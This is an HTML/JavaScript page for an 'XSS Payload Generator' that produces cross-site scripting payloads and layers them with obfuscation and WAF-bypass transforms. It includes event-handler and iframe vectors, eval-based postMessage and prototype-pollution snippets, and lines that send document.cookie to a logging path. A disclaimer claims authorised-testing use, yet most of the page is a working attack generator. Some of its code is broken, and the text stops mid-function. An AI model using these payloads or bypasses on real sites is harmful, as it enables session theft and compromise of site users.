<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS Payload Generator Pro 2025 - AI Bypass Engine</title>
    <style>
        :root {
            --cyber-blue: #00f3ff;
            --cyber-purple: #9d00ff;
            --matrix-green: #00ff41;
            --hacker-red: #ff003c;
            --dark-bg: #0a0a0f;
            --card-bg: #151520;
            --terminal-bg: #000;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        @font-face {
            font-family: 'Terminal';
            src: url('https://fonts.cdnfonts.com/css/cascadia-code');
        }
        
        body {
            font-family: 'Cascadia Code', 'Terminal', monospace;
            background: var(--dark-bg);
            color: var(--matrix-green);
            min-height: 100vh;
            overflow-x: hidden;
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(157, 0, 255, 0.1) 0%, transparent 20%),
                radial-gradient(circle at 90% 80%, rgba(0, 243, 255, 0.1) 0%, transparent 20%);
        }
        
        .cyber-grid {
            position: fixed;
            width: 100%;
            height: 100%;
            background-image: 
                linear-gradient(rgba(0, 243, 255, 0.05) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 243, 255, 0.05) 1px, transparent 1px);
            background-size: 50px 50px;
            pointer-events: none;
            z-index: -1;
        }
        
        .scanline {
            position: fixed;
            width: 100%;
            height: 2px;
            background: linear-gradient(to right, 
                transparent 0%, 
                var(--cyber-blue) 50%, 
                transparent 100%);
            box-shadow: 0 0 15px var(--cyber-blue);
            animation: scan 3s linear infinite;
            z-index: 9999;
            pointer-events: none;
        }
        
        @keyframes scan {
            0% { top: 0%; opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { top: 100%; opacity: 0; }
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
            position: relative;
        }
        
        header {
            text-align: center;
            padding: 40px 20px;
            border-bottom: 1px solid rgba(0, 243, 255, 0.3);
            margin-bottom: 40px;
            position: relative;
            overflow: hidden;
        }
        
        .glitch {
            font-size: 4rem;
            font-weight: 900;
            color: var(--cyber-blue);
            text-transform: uppercase;
            letter-spacing: 4px;
            position: relative;
            text-shadow: 
                0.05em 0 0 var(--hacker-red),
                -0.025em -0.05em 0 var(--matrix-green),
                0.025em 0.05em 0 var(--cyber-purple);
            animation: glitch 5s infinite;
        }
        
        @keyframes glitch {
            0%, 14%, 15%, 49%, 50%, 99%, 100% {
                text-shadow: none;
            }
            15.1%, 49.9% {
                text-shadow: 
                    0.05em 0 0 var(--hacker-red),
                    -0.025em -0.05em 0 var(--matrix-green),
                    0.025em 0.05em 0 var(--cyber-purple);
            }
        }
        
        .subtitle {
            font-size: 1.2rem;
            color: var(--cyber-blue);
            margin-top: 10px;
            opacity: 0.8;
        }
        
        .warning-banner {
            background: rgba(255, 0, 60, 0.1);
            border: 1px solid var(--hacker-red);
            padding: 20px;
            border-radius: 8px;
            margin: 30px 0;
            display: flex;
            align-items: center;
            gap: 20px;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.8; }
        }
        
        .warning-icon {
            font-size: 2rem;
            color: var(--hacker-red);
            flex-shrink: 0;
        }
        
        .control-panel {
            background: rgba(21, 21, 32, 0.9);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(0, 243, 255, 0.3);
            border-radius: 12px;
            padding: 30px;
            margin-bottom: 40px;
            box-shadow: 0 0 30px rgba(0, 243, 255, 0.1);
        }
        
        .control-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-top: 20px;
        }
        
        .control-group {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        
        .control-label {
            color: var(--cyber-blue);
            font-size: 1.1rem;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .control-label i {
            color: var(--matrix-green);
        }
        
        select, input[type="range"] {
            background: rgba(0, 0, 0, 0.7);
            border: 1px solid rgba(0, 243, 255, 0.5);
            border-radius: 6px;
            color: var(--matrix-green);
            padding: 12px;
            font-family: inherit;
            font-size: 1rem;
            transition: all 0.3s;
        }
        
        select:focus, input[type="range"]:focus {
            outline: none;
            border-color: var(--cyber-blue);
            box-shadow: 0 0 15px rgba(0, 243, 255, 0.3);
        }
        
        input[type="range"] {
            -webkit-appearance: none;
            height: 8px;
            background: linear-gradient(90deg, var(--cyber-purple), var(--cyber-blue));
            border-radius: 4px;
        }
        
        input[type="range"]::-webkit-slider-thumb {
            -webkit-appearance: none;
            width: 20px;
            height: 20px;
            background: var(--matrix-green);
            border-radius: 50%;
            cursor: pointer;
            border: 2px solid var(--cyber-blue);
        }
        
        .generator-section {
            display: grid;
            grid-template-columns: 2fr 1fr;
            gap: 30px;
            margin-bottom: 40px;
        }
        
        @media (max-width: 1024px) {
            .generator-section {
                grid-template-columns: 1fr;
            }
        }
        
        .payload-display {
            background: var(--terminal-bg);
            border: 2px solid rgba(0, 243, 255, 0.5);
            border-radius: 12px;
            padding: 25px;
            min-height: 400px;
            overflow-x: auto;
            position: relative;
        }
        
        .payload-content {
            font-family: 'Cascadia Code', monospace;
            font-size: 0.95rem;
            line-height: 1.6;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        
        .payload-content .tag { color: #569cd6; }
        .payload-content .attr { color: #9cdcfe; }
        .payload-content .value { color: #ce9178; }
        .payload-content .string { color: #ce9178; }
        .payload-content .keyword { color: #c586c0; }
        .payload-content .comment { color: #6a9955; }
        .payload-content .function { color: #dcdcaa; }
        
        .sidebar {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }
        
        .action-button {
            background: linear-gradient(135deg, var(--cyber-purple), var(--cyber-blue));
            border: none;
            border-radius: 8px;
            color: white;
            padding: 18px 25px;
            font-family: inherit;
            font-size: 1.1rem;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .action-button:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 25px rgba(0, 243, 255, 0.4);
        }
        
        .action-button.danger {
            background: linear-gradient(135deg, var(--hacker-red), #ff006e);
        }
        
        .stats-panel {
            background: rgba(21, 21, 32, 0.9);
            border: 1px solid rgba(0, 255, 65, 0.3);
            border-radius: 12px;
            padding: 20px;
        }
        
        .stat-item {
            display: flex;
            justify-content: space-between;
            padding: 10px 0;
            border-bottom: 1px solid rgba(0, 255, 65, 0.1);
        }
        
        .stat-value {
            color: var(--matrix-green);
            font-weight: bold;
        }
        
        .payload-types {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 20px;
            margin-top: 40px;
        }
        
        .type-card {
            background: rgba(21, 21, 32, 0.8);
            border: 1px solid rgba(157, 0, 255, 0.3);
            border-radius: 10px;
            padding: 20px;
            cursor: pointer;
            transition: all 0.3s;
            text-align: center;
        }
        
        .type-card:hover {
            transform: translateY(-5px);
            border-color: var(--cyber-blue);
            box-shadow: 0 10px 20px rgba(0, 243, 255, 0.2);
        }
        
        .type-card.active {
            border-color: var(--matrix-green);
            background: rgba(0, 255, 65, 0.1);
        }
        
        .type-icon {
            font-size: 2.5rem;
            margin-bottom: 15px;
            color: var(--cyber-blue);
        }
        
        .history-section {
            margin-top: 40px;
            background: rgba(21, 21, 32, 0.9);
            border: 1px solid rgba(0, 243, 255, 0.3);
            border-radius: 12px;
            padding: 25px;
            max-height: 300px;
            overflow-y: auto;
        }
        
        .history-item {
            background: rgba(0, 0, 0, 0.5);
            border-left: 3px solid var(--cyber-blue);
            padding: 15px;
            margin-bottom: 10px;
            border-radius: 4px;
            font-family: monospace;
            font-size: 0.9rem;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .history-item:hover {
            background: rgba(0, 243, 255, 0.1);
            transform: translateX(5px);
        }
        
        footer {
            text-align: center;
            padding: 40px 20px;
            margin-top: 60px;
            border-top: 1px solid rgba(0, 243, 255, 0.3);
            color: rgba(0, 243, 255, 0.7);
        }
        
        .rainbow-text {
            background: linear-gradient(90deg, 
                var(--cyber-blue), 
                var(--cyber-purple), 
                var(--hacker-red), 
                var(--matrix-green));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            font-weight: bold;
        }
        
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: rgba(0, 255, 65, 0.9);
            color: var(--dark-bg);
            padding: 15px 25px;
            border-radius: 8px;
            font-weight: bold;
            transform: translateX(150%);
            transition: transform 0.3s;
            z-index: 10000;
        }
        
        .notification.show {
            transform: translateX(0);
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <div class="cyber-grid"></div>
    <div class="scanline"></div>
    
    <div class="container">
        <header>
            <h1 class="glitch">XSS GEN-AI 2025</h1>
            <div class="subtitle">AI-Powered Dynamic Payload Generator with Advanced Bypass Techniques</div>
        </header>
        
        <div class="warning-banner">
            <div class="warning-icon">⚠️</div>
            <div>
                <strong style="color: var(--hacker-red)">ETHICAL USE ONLY</strong><br>
                This tool generates payloads for <strong>authorized security testing only</strong>.<br>
                Use exclusively on systems you own or have explicit written permission to test.
            </div>
        </div>
        
        <div class="control-panel">
            <h2 style="color: var(--cyber-blue); margin-bottom: 20px;">
                <i class="fas fa-sliders-h"></i> GENERATOR CONTROLS
            </h2>
            
            <div class="control-grid">
                <div class="control-group">
                    <label class="control-label">
                        <i class="fas fa-robot"></i> AI Intelligence Level
                    </label>
                    <input type="range" id="aiLevel" min="1" max="10" value="7">
                    <div style="display: flex; justify-content: space-between; color: var(--cyber-blue);">
                        <span>Basic</span>
                        <span id="aiLevelValue">7/10</span>
                        <span>Advanced</span>
                    </div>
                </div>
                
                <div class="control-group">
                    <label class="control-label">
                        <i class="fas fa-shield-alt"></i> Security Bypass Level
                    </label>
                    <select id="bypassLevel">
                        <option value="low">Low (Basic Filters)</option>
                        <option value="medium" selected>Medium (WAF Bypass)</option>
                        <option value="high">High (Modern Browsers)</option>
                        <option value="extreme">Extreme (Experimental)</option>
                    </select>
                </div>
                
                <div class="control-group">
                    <label class="control-label">
                        <i class="fas fa-bolt"></i> Obfuscation Level
                    </label>
                    <select id="obfuscation">
                        <option value="none">None</option>
                        <option value="light">Light</option>
                        <option value="medium" selected>Medium</option>
                        <option value="heavy">Heavy</option>
                        <option value="quantum">Quantum (AI)</option>
                    </select>
                </div>
                
                <div class="control-group">
                    <label class="control-label">
                        <i class="fas fa-sync-alt"></i> Mutation Rate
                    </label>
                    <input type="range" id="mutationRate" min="0" max="100" value="50">
                    <div style="display: flex; justify-content: space-between; color: var(--cyber-blue);">
                        <span>Static</span>
                        <span id="mutationValue">50%</span>
                        <span>Dynamic</span>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="generator-section">
            <div class="payload-display">
                <div class="payload-content" id="payloadOutput">
                    <span class="comment">// Click GENERATE to create your first payload</span>
                </div>
            </div>
            
            <div class="sidebar">
                <button class="action-button" onclick="generatePayload()" id="generateBtn">
                    <i class="fas fa-bolt"></i>
                    GENERATE PAYLOAD
                </button>
                
                <button class="action-button" onclick="generateBatch()">
                    <i class="fas fa-layer-group"></i>
                    BATCH GENERATE (10)
                </button>
                
                <button class="action-button" onclick="testInSandbox()">
                    <i class="fas fa-vial"></i>
                    SANDBOX TEST
                </button>
                
                <button class="action-button danger" onclick="exportPayloads()">
                    <i class="fas fa-file-export"></i>
                    EXPORT ALL
                </button>
                
                <div class="stats-panel">
                    <h3 style="color: var(--matrix-green); margin-bottom: 15px;">
                        <i class="fas fa-chart-line"></i> GENERATION STATS
                    </h3>
                    <div class="stat-item">
                        <span>Total Generated:</span>
                        <span class="stat-value" id="totalGenerated">0</span>
                    </div>
                    <div class="stat-item">
                        <span>Success Rate:</span>
                        <span class="stat-value" id="successRate">0%</span>
                    </div>
                    <div class="stat-item">
                        <span>Unique Patterns:</span>
                        <span class="stat-value" id="uniquePatterns">0</span>
                    </div>
                    <div class="stat-item">
                        <span>Last Bypass:</span>
                        <span class="stat-value" id="lastBypass">None</span>
                    </div>
                </div>
            </div>
        </div>
        
        <h2 style="color: var(--cyber-blue); margin: 40px 0 20px;">
            <i class="fas fa-star-of-life"></i> PAYLOAD TYPES & TECHNIQUES
        </h2>
        
        <div class="payload-types" id="payloadTypes">
            <!-- Will be populated by JavaScript -->
        </div>
        
        <h2 style="color: var(--cyber-blue); margin: 40px 0 20px;">
            <i class="fas fa-history"></i> GENERATION HISTORY
        </h2>
        
        <div class="history-section" id="historySection">
            <!-- History items will be added here -->
        </div>
        
        <footer>
            <p class="rainbow-text">XSS GEN-AI 2025 | Advanced Payload Generation System</p>
            <p style="margin-top: 10px; font-size: 0.9rem;">
                This tool uses AI algorithms to generate unique XSS payloads for authorized security research.<br>
                All payloads are generated locally in your browser - no data is sent to external servers.
            </p>
            <div style="margin-top: 20px; color: rgba(0, 243, 255, 0.5);">
                <i class="fas fa-code"></i> Version 2.0.1 | 
                <i class="fas fa-shield-alt"></i> Security Level: MAXIMUM |
                <i class="fas fa-brain"></i> AI Engine: ACTIVE
            </div>
        </footer>
    </div>
    
    <div class="notification" id="notification">Copied to clipboard!</div>

    <script>
        // Global variables
        let generatedPayloads = [];
        let uniquePatterns = new Set();
        let generationStats = {
            total: 0,
            successfulTests: 0,
            bypassesAchieved: 0
        };
        
        // AI Engine Configuration
        const AI_ENGINE = {
            techniques: [
                'Template Literal Injection',
                'Unicode Obfuscation',
                'JSF*ck Variants',
                'DOM Clobbering',
                'Prototype Pollution',
                'Event Handler Bypass',
                'SVG Payloads',
                'WebSocket Injection',
                'PostMessage Exploitation',
                'Service Worker Hijacking',
                'CSP Bypass',
                'Iframe Sandbox Escape',
                'Data URI Exploitation',
                'Blob URL Manipulation',
                'Import Maps Injection',
                'Trusted Types Bypass',
                'Sanitizer API Evasion'
            ],
            
            bypassMethods: [
                'Case Variation',
                'White Space Manipulation',
                'Comment Injection',
                'Hex/Octal Encoding',
                'Unicode Normalization',
                'Template String Abuse',
                'Async/Await Wrapping',
                'Promise Chain Injection',
                'Generator Function Abuse',
                'Proxy Object Manipulation',
                'Reflect API Exploitation'
            ],
            
            obfuscationLevels: {
                none: 0,
                light: 1,
                medium: 2,
                heavy: 3,
                quantum: 4
            }
        };
        
        // Initialize
        document.addEventListener('DOMContentLoaded', () => {
            initializeUI();
            loadPayloadTypes();
            updateStats();
            
            // Update slider values
            document.getElementById('aiLevel').addEventListener('input', (e) => {
                document.getElementById('aiLevelValue').textContent = `${e.target.value}/10`;
            });
            
            document.getElementById('mutationRate').addEventListener('input', (e) => {
                document.getElementById('mutationValue').textContent = `${e.target.value}%`;
            });
            
            // Generate initial payload
            setTimeout(() => {
                generatePayload();
            }, 1000);
        });
        
        function initializeUI() {
            // Create cyber effects
            createCyberEffects();
        }
        
        function createCyberEffects() {
            // Add floating particles
            for (let i = 0; i < 50; i++) {
                const particle = document.createElement('div');
                particle.style.cssText = `
                    position: fixed;
                    width: 2px;
                    height: 2px;
                    background: ${Math.random() > 0.5 ? 'var(--cyber-blue)' : 'var(--matrix-green)'};
                    border-radius: 50%;
                    pointer-events: none;
                    z-index: -1;
                    opacity: ${Math.random() * 0.5 + 0.1};
                `;
                particle.style.left = `${Math.random() * 100}%`;
                particle.style.top = `${Math.random() * 100}%`;
                document.body.appendChild(particle);
                
                // Animate
                animateParticle(particle);
            }
        }
        
        function animateParticle(el) {
            let x = parseFloat(el.style.left);
            let y = parseFloat(el.style.top);
            let dx = (Math.random() - 0.5) * 0.5;
            let dy = (Math.random() - 0.5) * 0.5;
            
            function move() {
                x += dx;
                y += dy;
                
                if (x < 0 || x > 100) dx *= -1;
                if (y < 0 || y > 100) dy *= -1;
                
                el.style.left = `${x}%`;
                el.style.top = `${y}%`;
                
                requestAnimationFrame(move);
            }
            move();
        }
        
        function loadPayloadTypes() {
            const types = [
                { icon: 'fa-code', name: 'HTML Injection', color: '#569cd6' },
                { icon: 'fa-magic', name: 'JS Obfuscation', color: '#9cdcfe' },
                { icon: 'fa-shield-alt', name: 'WAF Bypass', color: '#ce9178' },
                { icon: 'fa-bolt', name: 'Quick Execution', color: '#c586c0' },
                { icon: 'fa-expand', name: 'DOM Based', color: '#dcdcaa' },
                { icon: 'fa-image', name: 'SVG Payloads', color: '#4ec9b0' },
                { icon: 'fa-window-maximize', name: 'Iframe Attacks', color: '#d7ba7d' },
                { icon: 'fa-network-wired', name: 'PostMessage', color: '#f44747' },
                { icon: 'fa-user-secret', name: 'Stealth Mode', color: '#6a9955' },
                { icon: 'fa-robot', name: 'AI Generated', color: '#00f3ff' }
            ];
            
            const container = document.getElementById('payloadTypes');
            types.forEach(type => {
                const card = document.createElement('div');
                card.className = 'type-card';
                card.innerHTML = `
                    <div class="type-icon">
                        <i class="fas ${type.icon}"></i>
                    </div>
                    <div style="color: ${type.color}; font-weight: bold;">
                        ${type.name}
                    </div>
                `;
                card.onclick = () => selectPayloadType(type.name);
                container.appendChild(card);
            });
        }
        
        function selectPayloadType(type) {
            document.querySelectorAll('.type-card').forEach(card => {
                card.classList.remove('active');
            });
            event.currentTarget.classList.add('active');
            
            showNotification(`Selected: ${type}`);
            
            // Update generation with selected type
            generatePayload();
        }
        
        // Core Generation Engine
        function generatePayload() {
            const btn = document.getElementById('generateBtn');
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> GENERATING...';
            btn.disabled = true;
            
            setTimeout(() => {
                try {
                    const config = getConfig();
                    const payload = createPayload(config);
                    
                    displayPayload(payload);
                    addToHistory(payload);
                    updateGenerationStats();
                    
                    // Test payload
                    testPayload(payload);
                    
                } catch (error) {
                    console.error('Generation error:', error);
                    showNotification('Generation failed!', 'error');
                } finally {
                    btn.innerHTML = '<i class="fas fa-bolt"></i> GENERATE PAYLOAD';
                    btn.disabled = false;
                }
            }, 500);
        }
        
        function getConfig() {
            return {
                aiLevel: parseInt(document.getElementById('aiLevel').value),
                bypassLevel: document.getElementById('bypassLevel').value,
                obfuscation: document.getElementById('obfuscation').value,
                mutationRate: parseInt(document.getElementById('mutationRate').value) / 100
            };
        }
        
        function createPayload(config) {
            const engine = new PayloadEngine(config);
            return engine.generate();
        }
        
        class PayloadEngine {
            constructor(config) {
                this.config = config;
                this.techniques = this.selectTechniques();
                this.obfuscator = new ObfuscationEngine(config.obfuscation);
            }
            
            selectTechniques() {
                const baseTechs = ['HTML', 'JavaScript', 'Event'];
                const advancedTechs = config.aiLevel > 5 ? 
                    AI_ENGINE.techniques.slice(0, config.aiLevel - 2) : [];
                
                return [...baseTechs, ...advancedTechs].sort(() => Math.random() - 0.5);
            }
            
            generate() {
                const method = this.selectGenerationMethod();
                let payload = method();
                
                // Apply obfuscation
                payload = this.obfuscator.obfuscate(payload);
                
                // Apply mutation if needed
                if (Math.random() < this.config.mutationRate) {
                    payload = this.mutate(payload);
                }
                
                // Add bypass techniques
                payload = this.addBypass(payload);
                
                return {
                    id: Date.now() + Math.random(),
                    content: payload,
                    type: method.name,
                    timestamp: new Date().toISOString(),
                    config: { ...this.config },
                    techniques: this.techniques.slice(0, 3)
                };
            }
            
            selectGenerationMethod() {
                const methods = [
                    this.generateHTMLInjection,
                    this.generateJSPayload,
                    this.generateSVGAttack,
                    this.generateIframeExploit,
                    this.generatePostMessage,
                    this.generateDataURI,
                    this.generateBlobAttack,
                    this.generateTemplateInjection,
                    this.generateDOMClobbering,
                    this.generatePrototypePollution
                ];
                
                return methods[Math.floor(Math.random() * methods.length)];
            }
            
            generateHTMLInjection() {
                const vectors = [
                    `<img src=x onerror="${this.getRandomAlert()}">`,
                    `<svg onload="${this.getRandomAlert()}"></svg>`,
                    `<body onload="${this.getRandomAlert()}">`,
                    `<input autofocus onfocus="${this.getRandomAlert()}" >`,
                    `<video><source onerror="${this.getRandomAlert()}">`,
                    `<iframe srcdoc="<script>${this.getRandomAlert()}<\\/script>">`,
                    `<details ontoggle="${this.getRandomAlert()}">`,
                    `<marquee onstart="${this.getRandomAlert()}">`,
                    `<audio src=x onerror="${this.getRandomAlert()}">`,
                    `<form><button formaction="javascript:${this.getRandomAlert()}">`
                ];
                
                return this.randomize(vectors[Math.floor(Math.random() * vectors.length)]);
            }
            
            generateJSPayload() {
                const templates = [
                    `javascript:${this.getRandomAlert()}`,
                    `<script>${this.getRandomAlert()}<\\/script>`,
                    `" onmouseover="${this.getRandomAlert()}" `,
                    `'><script>${this.getRandomAlert()}<\\/script>`,
                    `\`);${this.getRandomAlert()} //`,
                    `</textarea><script>${this.getRandomAlert()}<\\/script>`,
                    `${this.generateJSFuck()}`,
                    `location=${this.getRandomAlert()}`,
                    `document.write(${this.getRandomAlert()})`,
                    `eval(${this.obfuscator.encode(this.getRandomAlert())})`
                ];
                
                return templates[Math.floor(Math.random() * templates.length)];
            }
            
            generateSVGAttack() {
                return `<svg xmlns="http://www.w3.org/2000/svg">
                    <script>${this.getRandomAlert()}<\\/script>
                    <image href="x" onerror="${this.getRandomAlert()}"/>
                    <animate onbegin="${this.getRandomAlert()}"/>
                    <set attributeName="onload" to="${this.getRandomAlert()}"/>
                </svg>`;
            }
            
            generateIframeExploit() {
                return `<iframe 
                    src="javascript:${this.getRandomAlert()}"
                    sandbox="allow-scripts allow-modals"
                    style="position:fixed;top:0;left:0;width:100px;height:100px;border:none;"
                ></iframe>`;
            }
            
            generatePostMessage() {
                return `<script>
                    top.postMessage({
                        type: 'xss',
                        payload: ${this.getRandomAlert().replace('alert', '')}
                    }, '*');
                    window.addEventListener('message', e => {
                        if(e.data.cmd) eval(e.data.cmd);
                    });
                <\\/script>`;
            }
            
            generateDataURI() {
                const payload = btoa(`<script>${this.getRandomAlert()}<\\/script>`);
                return `data:text/html;base64,${payload}`;
            }
            
            generateBlobAttack() {
                return `<script>
                    const blob = new Blob(['${this.getRandomAlert()}'], {type: 'text/html'});
                    const url = URL.createObjectURL(blob);
                    location = url;
                <\\/script>`;
            }
            
            generateTemplateInjection() {
                return `\${${this.getRandomAlert()}}`;
            }
            
            generateDOMClobbering() {
                return `<form id=clobber>
                    <input name=body onfocus=${this.getRandomAlert()} autofocus>
                </form>
                <script>
                    document.body.innerHTML = clobber.body.value;
                <\\/script>`;
            }
            
            generatePrototypePollution() {
                return `<script>
                    Object.prototype.polluted = "${this.getRandomAlert()}";
                    const obj = {};
                    if(obj.polluted) eval(obj.polluted);
                <\\/script>`;
            }
            
            generateJSFuck() {
                const chars = '[]()!+';
                let output = '';
                const alertStr = 'alert(1)';
                
                for(let char of alertStr) {
                    // Simplified JSFuck-like generation
                    output += `[][${chars[Math.floor(Math.random() * chars.length)]}]`;
                }
                
                return output;
            }
            
            getRandomAlert() {
                const alerts = [
                    `alert(document.domain)`,
                    `alert(window.origin)`,
                    `alert(location.href)`,
                    `console.log('XSS:', document.domain)`,
                    `document.title='XSS'`,
                    `window.name='XSS'`,
                    `navigator.sendBeacon('/log', document.cookie)`,
                    `fetch('/log?c='+document.cookie)`,
                    `new Image().src='/log?d='+document.domain`,
                    `document.body.style.background='red'`
                ];
                
                return alerts[Math.floor(Math.random() * alerts.length)];
            }
            
            randomize(payload) {
                // Add random variations
                const variations = [
                    str => str.replace('onerror', this.randomCase('onerror')),
                    str => str.replace('alert', `al${'e'.repeat(Math.random() * 3 + 1)}rt`),
                    str => str.split('').map(c => Math.random() > 0.8 ? `&#${c.charCodeAt(0)};` : c).join(''),
                    str => str.replace(/\s+/g, () => ' '.repeat(Math.random() * 3 + 1)),
                    str => str.replace(/"/g, Math.random() > 0.5 ? "'" : '"'),
                    str => str + '/*' + Math.random().toString(36).substring(7) + '*/'
                ];
                
                variations.forEach(variation => {
                    if (Math.random() < this.config.mutationRate) {
                        payload = variation(payload);
                    }
                });
                
                return payload;
            }
            
            randomCase(str) {
                return str.split('').map(c => 
                    Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()
                ).join('');
            }
            
            mutate(payload) {
                const mutations = [
                    // Add random comments
                    p => p.replace(/>/, `><!--${Math.random().toString(36)}--><`),
                    // Add null bytes
                    p => p.replace(/onerror=/, `onerror\x00=`),
                    // Add line breaks
                    p => p.replace(/ /g, '\n'),
                    // Add tab characters
                    p => p.replace(/ /g, '\t'),
                    // Add carriage returns
                    p => p.replace(/>/, '\r>')
                ];
                
                mutations.forEach(mutation => {
                    if (Math.random() < 0.3) {
                        payload = mutation(payload);
                    }
                });
                
                return payload;
            }
            
            addBypass(payload) {
                const bypassLevel = this.config.bypassLevel;
                const bypasses = {
                    low: [
                        p => p.replace(/alert/g, 'al\u0065rt'),
                        p => p.replace(/script/g, 'scr\u0069pt'),
                        p => p.replace(/onerror/g, 'on\u0065rror')
                    ],
                    medium: [
                        p => p.replace(/</g, '&lt;').replace(/>/g, '&gt;'),
                        p => `javascript:/*${Math.random().toString(36)}*/${p}`,
                        p => p.replace(/"/g, String.fromCharCode(34)),
                        p => p.replace(/'/g, String.fromCharCode(39))
                    ],
                    high: [
                        p => `"${p}"`.split('').map(c => `\\x${c.charCodeAt(0).toString(16)}`).join(''),
                        p => `eval(atob('${btoa(p)}'))`,
                        p => `new Function('${p.split('').map(c => c.charCodeAt(0)).join(',')}')`,
                        p => `[].constructor.constructor('${p}')()`
                    ],
                    extreme: [
                        p => {
                            const chars = p.split('');
                            const encoded = chars.map(c => 
                                `\\u${c.charCodeAt(0).toString(16).padStart(4, '0')}`
                            ).join('');
                            return `eval(unescape('${encoded}'))`;
                        },
                        p => `$($.parseXML('<r><![CDATA[${p}]]></r>')).find('r').text()`,
                        p => `import('data:text/javascript,${encodeURIComponent(p)}')`,
                        p => `window['ev' + 'al'](${JSON.stringify(p)})`
                    ]
                };
                
                bypasses[bypassLevel].forEach(bypass => {
                    if (Math.random() < 0.5) {
                        payload = bypass(payload);
                    }
                });
                
                return payload;
            }
        }
        
        class ObfuscationEngine {
            constructor(level) {
                this.level = AI_ENGINE.obfuscationLevels[level];
            }
            
            obfuscate(payload) {
                const methods = [
                    this.addRandomComments,
                    this.encodeSpecialChars,
                    this.splitStrings,
                    this.useTemplateLiterals,
                    this.addDeadCode,
                    this.obfuscateWithUnicode,
                    this.useJSFuckPartial,
                    this.encodeWithBase64,
                    this.useHexEncoding,
                    this.obfuscateWithMath
                ];
                
                // Apply more obfuscation based on level
                for (let i = 0; i < this.level; i++) {
                    const method = methods[Math.floor(Math.random() * methods.length)];
                    payload = method(payload);
                }
                
                return payload;
            }
            
            addRandomComments(payload) {
                const comments = [
                    '/* bypass */',
                    '// waf evasion',
                    '/* security test */',
                    '// xss research',
                    '/* authorized testing */'
                ];
                
                const comment = comments[Math.floor(Math.random() * comments.length)];
                return payload.replace(/>/, `>${comment}`);
            }
            
            encodeSpecialChars(payload) {
                return payload.replace(/[<>"'&]/g, match => 
                    `&#${match.charCodeAt(0)};`
                );
            }
            
            splitStrings(payload) {
                return payload.replace(/alert/g, "al" + "ert")
                             .replace(/onerror/g, "on" + "error")
                             .replace(/script/g, "scr" + "ipt");
            }
            
            useTemplateLiterals(payload) {
                return payload.replace(/alert\((.+?)\)/g, "alert(`${$1}`)");
            }
            
            addDeadCode(payload) {
                const deadCode = [
                    ';void(0);',
                    ';true;',
                    ';false;',
                    ';null;',
                    ';undefined;'
                ];
                
                return payload + deadCode[Math.floor(Math.random() * deadCode.length)];
            }
            
            obfuscateWithUnicode(payload) {
                return payload.replace(/[a-z]/gi, c => 
                    Math.random() > 0.7 ? `\\u00${c.charCodeAt(0).toString(16)}` : c
                );
            }
            
            useJSFuckPartial(payload) {
                const jsfuckMap = {
                    'a': 'false+true',
                    'l': 'true+false',
                    'e': '!false',
                    'r': '!true',
                    't': '!!true'
                };
                
                return payload.replace(/alert/g, match => 
                    match.split('').map(c => jsfuckMap[c] || c).join('+')
                );
            }
            
            encodeWithBase64(payload) {
                if (payload.includes('alert')) {
                    const encoded = btoa(payload.match(/alert\((.+?)\)/)?.[1] || '');
                    return payload.replace(/alert\((.+?)\)/, `eval(atob('${encoded}'))`);
                }
                return payload;
            }
            
            useHexEncoding(payload) {
                return payload.replace(/onerror/g, 
                    '\\x6f\\x6e\\x65\\x72\\x72\\x6f\\x72'
                );
            }
            
            obfuscateWithMath(payload) {
                return payload.replace(/1/g, () => 
                    Math.floor(Math.random() * 9 + 1).toString()
                );
            }
            
            encode(str) {
                return btoa(str).split('').reverse().join('');
            }
        }
        
        function displayPayload(payloadObj) {
            const output = document.getElementById('payloadOutput');
            const content = payloadObj.content;
            
            // Syntax highlighting
            let highlighted = content
                .replace(/&/g, '&amp;')
                .replace(/</g, '&lt;')
                .replace(/>/g, '&gt;')
                .replace(/"/g, '&quot;')
                .replace(/'/g, '&#039;');
            
            highlighted = highlighted
                .replace(/(&lt;\/?)(script|iframe|img|svg|div|span|form|input|button|textarea|marquee|details|body|video|audio)(\s|&gt;)/gi, 
                    '<span class="tag">$1$2</span>$3')
                .replace(/\b(on\w+)=/gi, '<span class="attr">$1</span>=')
                .replace(/(javascript:|data:|blob:)/gi, '<span class="keyword">$1</span>')
                .replace(/(alert|eval|document|window|location|navigator)\b/gi, 
                    '<span class="function">$1</span>')
                .replace(/('.*?'|".*?")/g, '<span class="string">$1</span>')
                .replace(/\/\/.*|\/\*[\s\S]*?\*\//g, '<span class="comment">$&</span>');
            
            output.innerHTML = highlighted;
            
            // Add copy functionality
            output.onclick = () => {
                navigator.clipboard.writeText(content)
                    .then(() => showNotification('Payload copied to clipboard!'))
                    .catch(() => {
                        const textArea = document.createElement('textarea');
                        textArea.value = content;
                        document.body.appendChild(textArea);
                        textArea.select();
                        document.execCommand('copy');
                        document.body.removeChild(textArea);
